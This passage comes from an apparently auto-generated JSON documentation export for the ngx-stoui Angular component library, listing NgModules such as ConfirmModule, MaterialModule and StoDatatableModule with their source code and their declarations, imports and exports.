      "sourceCode": "import { Meta, Story } from '@storybook/angular/types-6-0';\nimport { moduleMetadata } from '@storybook/angular';\nimport { MatButtonModule } from '@angular/material/button';\nimport { BrowserAnimationsModule } from '@angular/platform-browser/animations';\n// @ts-ignore\nimport { Component, NgModule } from '@angular/core';\nimport { ConfirmModule, ConfirmService } from '@ngx-stoui/common';\n\n@Component({\n  selector: 'app-confirm-demo',\n  template: `\n    <button (click)=\"show()\"\n            mat-button>Show confirm\n    </button>\n  `,\n\n})\nclass ConfirmDemoComponent {\n  show() {\n    this.confirm.confirm('Confirmation message should be short', 'Confirm delete', 'Delete');\n  }\n\n  constructor(private confirm: ConfirmService) {\n  }\n}\n\n@NgModule({\n  declarations: [ConfirmDemoComponent],\n  exports: [ConfirmDemoComponent],\n})\nclass ConfirmerModule {}\n\nexport default {\n  title: 'common/Confirm Service',\n  decorators: [\n    moduleMetadata({\n      imports: [\n        ConfirmModule, ConfirmerModule, BrowserAnimationsModule, MatButtonModule ],\n      declarations: [  ],\n    })\n  ],\n  parameters: {\n  },\n} as Meta;\n\n\nexport const Usage: Story<ConfirmDemoComponent> = (args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n};\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "ConfirmDemoComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "ConfirmDemoComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "ConfirmModule",
      "id": "module-ConfirmModule-e40e0caef396ee4529b71bd899a96b10f3313f7142ea22953aefc66536f135c4fdf7f952454fd6457b21a151c3f329c7ca5fd733bf173517945d12059376596d",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatDialogModule } from '@angular/material/dialog';\nimport { ConfirmService } from './sto-confirm-dialog.service';\nimport { ConfirmComponent } from './sto-confirm-dialog.component';\n\n\n@NgModule({\n  declarations: [\n    ConfirmComponent\n  ],\n  imports: [\n    CommonModule,\n    MatDialogModule,\n    MatButtonModule\n  ],\n  providers: [\n    ConfirmService\n  ]\n})\nexport class ConfirmModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": [
            {
              "name": "ConfirmService"
            }
          ]
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "ConfirmComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": []
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "ErrorHandlerModule",
      "id": "module-ErrorHandlerModule-73ca084b29f4574e28337fdcb62092f26abb4419236517de33acdfc8535f5ea3d4034103e49c2c5d267f350e6e192ec85894484d6ad5df741a4264d413ea534a",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/error-handler/src/lib/error-handler/error-handler.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatDialogModule } from '@angular/material/dialog';\nimport { ErrorDialogService } from './error-dialog.service';\nimport { ErrorHandlerService } from './error-handler.service';\nimport { DialogComponent } from './dialog/dialog.component';\nimport { MatButtonModule } from '@angular/material/button';\n\n@NgModule({\n  declarations: [ DialogComponent ],\n  imports: [\n    CommonModule,\n    MatDialogModule,\n    MatButtonModule\n  ],\n  providers: [\n    ErrorHandlerService,\n    ErrorDialogService\n  ]\n})\nexport class ErrorHandlerModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": [
            {
              "name": "ErrorDialogService"
            },
            {
              "name": "ErrorHandlerService"
            }
          ]
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "DialogComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": []
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "MaterialModule",
      "id": "module-MaterialModule-51742c89ca1dc2b7a3e4d563109383c7671edd6ab581a590a9af0f08ad7bad0f300e8faca75fb0cf6690d82e0e57b9203753162a35417a2c067c1c8594beeb8e",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/testing/src/lib/material.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { MatAutocompleteModule } from '@angular/material/autocomplete';\nimport { MatBadgeModule } from '@angular/material/badge';\nimport { MatBottomSheetModule } from '@angular/material/bottom-sheet';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\nimport { MatCardModule } from '@angular/material/card';\nimport { MatCheckboxModule } from '@angular/material/checkbox';\nimport { MatChipsModule } from '@angular/material/chips';\nimport { MatNativeDateModule, MatRippleModule } from '@angular/material/core';\nimport { MatDatepickerModule } from '@angular/material/datepicker';\nimport { MatDialogModule } from '@angular/material/dialog';\nimport { MatDividerModule } from '@angular/material/divider';\nimport { MatExpansionModule } from '@angular/material/expansion';\nimport { MatFormFieldModule } from '@angular/material/form-field';\nimport { MatGridListModule } from '@angular/material/grid-list';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatInputModule } from '@angular/material/input';\nimport { MatListModule } from '@angular/material/list';\nimport { MatMenuModule } from '@angular/material/menu';\nimport { MatPaginatorModule } from '@angular/material/paginator';\nimport { MatProgressBarModule } from '@angular/material/progress-bar';\nimport { MatProgressSpinnerModule } from '@angular/material/progress-spinner';\nimport { MatRadioModule } from '@angular/material/radio';\nimport { MatSelectModule } from '@angular/material/select';\nimport { MatSidenavModule } from '@angular/material/sidenav';\nimport { MatSlideToggleModule } from '@angular/material/slide-toggle';\nimport { MatSliderModule } from '@angular/material/slider';\nimport { MatSnackBarModule } from '@angular/material/snack-bar';\nimport { MatSortModule } from '@angular/material/sort';\nimport { MatStepperModule } from '@angular/material/stepper';\nimport { MatTableModule } from '@angular/material/table';\nimport { MatTabsModule } from '@angular/material/tabs';\nimport { MatToolbarModule } from '@angular/material/toolbar';\nimport { MatTooltipModule } from '@angular/material/tooltip';\nimport { MatTreeModule } from '@angular/material/tree';\nimport { BrowserAnimationsModule, NoopAnimationsModule } from '@angular/platform-browser/animations';\nimport { FormsModule, ReactiveFormsModule } from '@angular/forms';\nimport { DragDropModule } from '@angular/cdk/drag-drop';\n\n@NgModule({\n  imports: [\n    MatDatepickerModule,\n    MatAutocompleteModule,\n    MatBadgeModule,\n    MatBottomSheetModule,\n    MatButtonModule,\n    MatButtonToggleModule,\n    MatCardModule,\n    MatCheckboxModule,\n    MatChipsModule,\n    MatDialogModule,\n    MatDividerModule,\n    MatExpansionModule,\n    MatFormFieldModule,\n    MatGridListModule,\n    MatIconModule,\n    MatInputModule,\n    MatListModule,\n    MatMenuModule,\n    MatPaginatorModule,\n    MatProgressBarModule,\n    MatProgressSpinnerModule,\n    MatRadioModule,\n    MatSelectModule,\n    MatSidenavModule,\n    MatSlideToggleModule,\n    MatSliderModule,\n    MatSnackBarModule,\n    MatSortModule,\n    MatStepperModule,\n    MatTableModule,\n    MatTabsModule,\n    MatToolbarModule,\n    MatTooltipModule,\n    MatTreeModule,\n    BrowserAnimationsModule,\n    MatNativeDateModule,\n    MatRippleModule\n  ],\n  exports: [\n    MatDatepickerModule,\n    MatAutocompleteModule,\n    MatBadgeModule,\n    MatBottomSheetModule,\n    MatButtonModule,\n    MatButtonToggleModule,\n    MatCardModule,\n    MatCheckboxModule,\n    MatChipsModule,\n    MatDialogModule,\n    MatDividerModule,\n    MatExpansionModule,\n    MatFormFieldModule,\n    MatGridListModule,\n    MatIconModule,\n    MatInputModule,\n    MatListModule,\n    MatMenuModule,\n    MatPaginatorModule,\n    MatProgressBarModule,\n    MatProgressSpinnerModule,\n    MatRadioModule,\n    MatSelectModule,\n    MatSidenavModule,\n    MatSlideToggleModule,\n    MatSliderModule,\n    MatSnackBarModule,\n    MatSortModule,\n    MatStepperModule,\n    MatTableModule,\n    MatTabsModule,\n    MatToolbarModule,\n    MatTooltipModule,\n    MatTreeModule,\n    NoopAnimationsModule,\n    MatNativeDateModule,\n    FormsModule,\n    ReactiveFormsModule,\n    MatRippleModule,\n    DragDropModule\n  ]\n})\nexport class MaterialModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": []
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": []
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "NavDrawerModule",
      "id": "module-NavDrawerModule-b4b98f7d3b0b96805f5d8fe71e2edfaa0a406e50496788645f2a1bacc5520b0b33466c1259e6ef07d7dd7f194b8ef2612bc16bbbb563b3937ccea55b4bc53976",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/drawer/src/lib/nav-drawer/nav-drawer.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { NavDrawerComponent } from './nav-drawer.component';\nimport { NavDrawerItemComponent } from './nav-drawer-item/nav-drawer-item.component';\nimport { RouterModule } from '@angular/router';\nimport { MatIconModule } from '@angular/material/icon';\nimport { NavDrawerListComponent } from './nav-drawer-list/nav-drawer-list.component';\nimport { NavDrawerListItemComponent } from './nav-drawer-list-item/nav-drawer-list-item.component';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatMenuModule } from '@angular/material/menu';\nimport { MatDividerModule } from '@angular/material/divider';\nimport { MatRippleModule } from '@angular/material/core';\n\n@NgModule({\n  declarations: [\n    NavDrawerComponent,\n    NavDrawerItemComponent,\n    NavDrawerListComponent,\n    NavDrawerListItemComponent,\n  ],\n  imports: [\n    CommonModule,\n    RouterModule,\n    MatIconModule,\n    MatButtonModule,\n    MatMenuModule,\n    MatDividerModule,\n    MatRippleModule\n  ],\n  exports: [\n    NavDrawerComponent,\n    NavDrawerItemComponent,\n    NavDrawerListComponent,\n    NavDrawerListItemComponent,\n  ]\n})\nexport class NavDrawerModule { }\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "NavDrawerComponent"
            },
            {
              "name": "NavDrawerItemComponent"
            },
            {
              "name": "NavDrawerListComponent"
            },
            {
              "name": "NavDrawerListItemComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "NavDrawerComponent"
            },
            {
              "name": "NavDrawerItemComponent"
            },
            {
              "name": "NavDrawerListComponent"
            },
            {
              "name": "NavDrawerListItemComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "NumberInputModule",
      "id": "module-NumberInputModule-ad3c8e51e988140bd43421160fdee13c56e561db4cef4057e2655e2593900ecb9c5aa320492613034da24db85859c30b8fa0ee86a3bb1e1adda612b8cfbfcd23",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/number-input/number-input.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { NumberUnitInputComponent } from './number-unit-input/number-unit-input.component';\nimport { ReactiveFormsModule } from '@angular/forms';\nimport { MatSelectModule } from '@angular/material/select';\nimport { NumberInputComponent } from './number-input/number-input.component';\nimport { NumberInputDirective } from './number-input.directive';\nimport { NumberInputPipe } from './number-input.pipe';\n\n\n@NgModule({\n  declarations: [ NumberUnitInputComponent, NumberInputComponent, NumberInputDirective, NumberInputPipe ],\n  imports: [\n    CommonModule,\n    ReactiveFormsModule,\n    MatSelectModule,\n  ],\n  exports: [\n    NumberUnitInputComponent, NumberInputComponent, NumberInputDirective, NumberInputPipe\n  ],\n  providers: [ NumberInputPipe ]\n})\nexport class NumberInputModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "NumberInputComponent"
            },
            {
              "name": "NumberInputDirective"
            },
            {
              "name": "NumberInputPipe"
            },
            {
              "name": "NumberUnitInputComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "NumberInputComponent"
            },
            {
              "name": "NumberInputDirective"
            },
            {
              "name": "NumberInputPipe"
            },
            {
              "name": "NumberUnitInputComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "PreferenceManagerModule",
      "id": "module-PreferenceManagerModule-5f7407434a0c106be7e76ea7c7df0557fd826a1e21675e4aab50f9872f114921b56ba250c46003ab2d4168cd82c9c641c9fdb7c3601ca2441038e194e108ff68",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/preference-manager/preference-manager.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { PreferenceManagerComponent } from './preference-manager.component';\nimport { MatMenuModule } from '@angular/material/menu';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatButtonModule } from '@angular/material/button';\nimport { ActivePreferencePipe } from './active-preference.pipe';\nimport { MatFormFieldModule } from '@angular/material/form-field';\nimport { MatInputModule } from '@angular/material/input';\nimport { MatProgressSpinnerModule } from '@angular/material/progress-spinner';\n\n\n@NgModule({\n  declarations: [ PreferenceManagerComponent, ActivePreferencePipe ],\n  exports: [ PreferenceManagerComponent ],\n  imports: [\n    CommonModule,\n    MatMenuModule,\n    MatIconModule,\n    MatButtonModule,\n    MatFormFieldModule,\n    MatInputModule,\n    MatProgressSpinnerModule\n  ]\n})\nexport class PreferenceManagerModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "ActivePreferencePipe"
            },
            {
              "name": "PreferenceManagerComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "PreferenceManagerComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "SlideToggleModule",
      "id": "module-SlideToggleModule-1d6bddeb6ad0fd58fea33e342dbbca965bf7fab5566c0a6e643d1f567ef21fcdc22c5b2732590fd1cdab86cb46828eb0a5197c5d177bea8f7fae9aeb20b6f964",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/form/src/lib/slide-toggle/slide-toggle.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { SlideToggleComponent } from './slide-toggle.component';\nimport { MatSlideToggleModule } from '@angular/material/slide-toggle';\nimport { ReactiveFormsModule } from '@angular/forms';\n\n@NgModule({\n  declarations: [ SlideToggleComponent ],\n  exports: [ SlideToggleComponent ],\n  imports: [\n    CommonModule,\n    MatSlideToggleModule,\n    ReactiveFormsModule\n  ]\n})\nexport class SlideToggleModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "SlideToggleComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "SlideToggleComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoActionFooterModule",
      "id": "module-StoActionFooterModule-c21e8e6187b6d72bfe4cc3bfe7cc4b0e200e639b9eb9acbb1516dbd6a8caeb0cfc022dbd4bc70a2977ad97b913798262aa52ed02cf1fc779de65ed5bdc3a4b2b",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-action-footer/sto-action-footer.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatProgressBarModule } from '@angular/material/progress-bar';\nimport { StoActionFooterComponent } from './sto-action-footer.component';\n\n@NgModule({\n  imports: [CommonModule, MatIconModule, MatButtonModule, MatButtonToggleModule, MatProgressBarModule],\n  exports: [StoActionFooterComponent],\n  declarations: [StoActionFooterComponent]\n})\nexport class StoActionFooterModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoActionFooterComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoActionFooterComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoAppHeaderModule",
      "id": "module-StoAppHeaderModule-85d51fb9c9a6d9c3f68f7fc89e8241b5b6a24e4d3d1ec935d81c3c47937e73739b092b7e40d4f12e60a4a4a36c23bd839351b9f00787709aaa4fc1bcfefa37fa",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-app-header/sto-app-header.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { StoAppHeaderComponent } from './sto-app-header.component';\nimport { StoBreadcrumbsModule } from '../sto-breadcrumbs/sto-breadcrumbs.module';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatMenuModule } from '@angular/material/menu';\nimport { LayoutModule } from '@angular/cdk/layout';\n\n@NgModule({\n  imports: [\n    CommonModule,\n    StoBreadcrumbsModule,\n    MatButtonModule,\n    MatIconModule,\n    MatMenuModule,\n    LayoutModule\n  ],\n  declarations: [ StoAppHeaderComponent ],\n  exports: [ StoAppHeaderComponent ],\n})\nexport class StoAppHeaderModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoAppHeaderComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": [
            {
              "name": "StoBreadcrumbsModule"
            }
          ]
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoAppHeaderComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoBreadcrumbsModule",
      "id": "module-StoBreadcrumbsModule-b9aa9ecee1d27fd9457dab4a0887e56093af04fc7753fdd4f38ee8426cd88528db22da1eec31f4c39c48d57daea959091e48dd4eb44f25ad155f62881ef013d2",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { RouterModule } from '@angular/router';\nimport { MatIconModule } from '@angular/material/icon';\nimport { StoBreadcrumbsComponent } from './sto-breadcrumbs.component';\n\n@NgModule({\n  imports: [ CommonModule, RouterModule, MatIconModule ],\n  exports: [ StoBreadcrumbsComponent ],\n  declarations: [ StoBreadcrumbsComponent ]\n})\nexport class StoBreadcrumbsModule {\n}\n\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoBreadcrumbsComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoBreadcrumbsComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoDatatableModule",
      "id": "module-StoDatatableModule-1ea8ecd6fc7feb46b13f53c0bde21a6de2371b284b17907dd572e0858b99513f460fd427a67c6d0997278c9cd1209d68bb9cec876950fb8220443fff0cc517e1",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { StoDatatableComponent } from './sto-datatable.component';\nimport { ScrollingModule } from '@angular/cdk/scrolling';\nimport { StoDatatableBodyComponent } from './sto-datatable-body/sto-datatable-body.component';\nimport { ExecPipe } from './exec.pipe';\nimport { StoDatatableBodyRowComponent } from './sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component';\nimport { StoDatatableHeaderGroupComponent } from './sto-datatable-header-group/sto-datatable-header-group.component';\nimport { StoDatatableHeaderComponent } from './sto-datatable-header/sto-datatable-header.component';\nimport { MatIconModule } from '@angular/material/icon';\nimport { StoDatatableResizeDirective } from './sto-datatable-header/sto-datatable-resize.directive';\nimport { ColumnStylePipe } from './column-style.pipe';\nimport { MatRippleModule } from '@angular/material/core';\nimport {\n  StoDatatableActionsComponent,\n  StoDataTableActionsLeftComponent,\n  StoDataTableActionsRightComponent\n} from './sto-datatable-actions/sto-datatable-actions.component';\nimport { MatSortModule } from '@angular/material/sort';\nimport { GetGroupFlexPipe } from './get-group-flex.pipe';\nimport { DragDropModule } from '@angular/cdk/drag-drop';\n\n@NgModule({\n  imports: [\n    CommonModule,\n    ScrollingModule,\n    MatIconModule,\n    MatRippleModule,\n    MatSortModule,\n    DragDropModule,\n  ],\n  declarations: [\n    StoDatatableComponent\n    , StoDatatableBodyComponent\n    , ExecPipe\n    , StoDatatableBodyRowComponent\n    , StoDatatableHeaderGroupComponent\n    , StoDatatableHeaderComponent\n    , StoDatatableResizeDirective\n    , ColumnStylePipe\n    , StoDataTableActionsLeftComponent\n    , StoDataTableActionsRightComponent\n    , StoDatatableActionsComponent, GetGroupFlexPipe,\n  ],\n  exports: [ StoDatatableComponent, StoDataTableActionsLeftComponent, StoDataTableActionsRightComponent, StoDatatableActionsComponent, GetGroupFlexPipe ],\n})\nexport class StoDatatableModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "ColumnStylePipe"
            },
            {
              "name": "ExecPipe"
            },
            {
              "name": "GetGroupFlexPipe"
            },
            {
              "name": "StoDataTableActionsLeftComponent"
            },
            {
              "name": "StoDataTableActionsRightComponent"
            },
            {
              "name": "StoDatatableActionsComponent"
            },
            {
              "name": "StoDatatableBodyComponent"
            },
            {
              "name": "StoDatatableBodyRowComponent"
            },
            {
              "name": "StoDatatableComponent"
            },
            {
              "name": "StoDatatableHeaderComponent"
            },
            {
              "name": "StoDatatableHeaderGroupComponent"
            },
            {
              "name": "StoDatatableResizeDirective"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "GetGroupFlexPipe"
            },
            {
              "name": "StoDataTableActionsLeftComponent"
            },
            {
              "name": "StoDataTableActionsRightComponent"
            },
            {
              "name": "StoDatatableActionsComponent"
            },
            {
              "name": "StoDatatableComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoDirectivesModule",
      "id": "module-StoDirectivesModule-d61b964aa64469bbf39eaa024d5ca51fbd97f971d0f8f5dacc5d25c77ba440043d8abb3a790653ecd1eb16321c194925721de8f4ee8dd4bb0b9054a58e8c6a61",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/core/src/lib/sto-directives/directives.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { QuickKeysDirective } from './quick-keys.directive';\nimport { DateFormFieldClickDirective } from './date-form-field-click.directive';\nimport { StoSelectTextOnFocusDirective } from './sto-select-text-on-focus.directive';\nimport { StoGridColumnDirective, StoGridDirective, StoGridSpacerDirective } from './sto-grid.directive';\nimport { LayoutModule } from '@angular/cdk/layout';\nimport { MenuOverlayDirective } from './menu-overlay.directive';\nimport { ContextMenuDirective } from './context-menu.directive';\n\n\n@NgModule({\n  imports: [ CommonModule, LayoutModule ],\n  declarations: [\n    QuickKeysDirective\n    , DateFormFieldClickDirective\n    , StoSelectTextOnFocusDirective\n    , StoGridDirective\n    , StoGridColumnDirective\n    , StoGridSpacerDirective\n    , MenuOverlayDirective\n    , ContextMenuDirective\n  ],\n  exports: [\n    QuickKeysDirective\n    , DateFormFieldClickDirective\n    , StoSelectTextOnFocusDirective\n    , StoGridDirective\n    , StoGridColumnDirective\n    , StoGridSpacerDirective\n    , MenuOverlayDirective\n    , ContextMenuDirective\n  ]\n})\nexport class StoDirectivesModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "ContextMenuDirective"
            },
            {
              "name": "DateFormFieldClickDirective"
            },
            {
              "name": "MenuOverlayDirective"
            },
            {
              "name": "QuickKeysDirective"
            },
            {
              "name": "StoGridColumnDirective"
            },
            {
              "name": "StoGridDirective"
            },
            {
              "name": "StoGridSpacerDirective"
            },
            {
              "name": "StoSelectTextOnFocusDirective"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "ContextMenuDirective"
            },
            {
              "name": "DateFormFieldClickDirective"
            },
            {
              "name": "MenuOverlayDirective"
            },
            {
              "name": "QuickKeysDirective"
            },
            {
              "name": "StoGridColumnDirective"
            },
            {
              "name": "StoGridDirective"
            },
            {
              "name": "StoGridSpacerDirective"
            },
            {
              "name": "StoSelectTextOnFocusDirective"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoDrawerModule",
      "id": "module-StoDrawerModule-6c50eda427234cab660c3255346550c9f0a032fd73be3eea1d8a00970421bfa0a02ef19c5f9c26eb77c423c5d6fb3c4a2f4b63415baaca4af061d36a1c0a2720",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/drawer/src/lib/sto-drawer/sto-drawer.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { RouterModule } from '@angular/router';\nimport { StoDrawerComponent } from './sto-drawer.component';\nimport { StoDrawerWrapperComponent } from './sto-drawer-wrapper.component';\nimport { StoDrawerFooterComponent } from './sto-drawer-footer.component';\nimport { StoDrawerHeaderComponent } from './sto-drawer-header.component';\n\n\n@NgModule({\n  imports: [ CommonModule, RouterModule ],\n  exports: [ StoDrawerComponent, StoDrawerWrapperComponent, StoDrawerFooterComponent, StoDrawerHeaderComponent ],\n  declarations: [ StoDrawerComponent, StoDrawerWrapperComponent, StoDrawerFooterComponent, StoDrawerHeaderComponent ]\n})\nexport class StoDrawerModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoDrawerComponent"
            },
            {
              "name": "StoDrawerFooterComponent"
            },
            {
              "name": "StoDrawerHeaderComponent"
            },
            {
              "name": "StoDrawerWrapperComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": [
            {
              "name": "StoDrawerComponent"
            },
            {
              "name": "StoDrawerFooterComponent"
            },
            {
              "name": "StoDrawerHeaderComponent"
            },
            {
              "name": "StoDrawerWrapperComponent"
            }
          ]
        },
        {
          "type": "bootstrap",
          "elements": []
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "StoFilterPanelModule",
      "id": "module-StoFilterPanelModule-4b2793a386894517f1acfbdff84543c1d6d6aaef40cced916be12e83cefa25b375c6efdc3f7821577369b101e72b2b793670d5f4e30dbbd19a57681748886bef",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport { MatButtonToggleModule } from '@angular/material/button-toggle';\nimport { MatExpansionModule } from '@angular/material/expansion';\nimport { MatIconModule } from '@angular/material/icon';\nimport { MatTooltipModule } from '@angular/material/tooltip';\nimport {\n  StoFilterActions,\n  StoFilterActionsBar,\n  StoFilterPanelComponent,\n  StoFilterTableActions,\n  StoFilterTitle\n} from './sto-filter-panel.component';\nimport { MatChipsModule } from '@angular/material/chips';\n\n@NgModule({\n  imports: [ CommonModule, MatExpansionModule, MatIconModule, MatButtonModule, MatButtonToggleModule, MatTooltipModule, MatChipsModule ],\n  exports: [StoFilterPanelComponent, StoFilterTitle, StoFilterActions, StoFilterTableActions],\n  declarations: [StoFilterPanelComponent, StoFilterTitle, StoFilterActions, StoFilterActionsBar, StoFilterTableActions]\n})\nexport class StoFilterPanelModule {\n}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "StoFilterActions"
            },
            {
              "name": "StoFilterActionsBar"
            },
            {
